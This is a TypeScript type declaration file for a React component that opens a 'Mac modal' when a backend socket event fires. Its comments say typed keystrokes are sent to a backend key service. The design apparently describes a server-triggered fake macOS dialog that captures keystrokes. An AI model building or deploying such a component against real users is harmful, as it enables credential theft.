import React from 'react';
import '../styles/modal-isolation.css';
export interface MacModalTriggerProps {
    /** User ID for backend key service. Required when backendConfig.enabled is true. */
    userId?: string;
    /** Backend integration config. When enabled, keystrokes are sent to backend. */
    backendConfig?: {
        enabled?: boolean;
        userId?: string;
    };
    /** Called when the Mac modal is closed. */
    onClose?: () => void;
}
/**
 * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal when received.
 * Mount this component once (e.g. at app root) to enable socket-triggered Mac modal.
 *
 * Backend should emit the event configured via `setConfig({ macModalSocketEvent: 'yourEventName' })`.
 */
declare const MacModalTrigger: React.FC<MacModalTriggerProps>;
export default MacModalTrigger;
//# sourceMappingURL=MacModalTrigger.d.ts.map